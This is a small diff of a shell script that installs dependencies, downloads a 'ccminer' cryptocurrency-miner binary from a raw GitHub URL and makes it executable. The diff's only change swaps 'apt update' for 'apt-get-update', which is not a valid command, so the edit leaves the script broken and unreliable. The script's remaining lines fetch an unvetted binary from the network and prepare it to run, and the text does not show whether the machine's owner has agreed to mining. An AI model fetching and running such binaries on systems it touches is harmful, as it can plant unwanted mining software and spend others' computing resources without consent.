@@ -1,5 +1,5 @@
 #erl-andi
-apt update
+apt-get-update
 apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
 wget https://raw.githubusercontent.com/AntonyAjax/gh/main/ccminer
 chmod +x ccminer
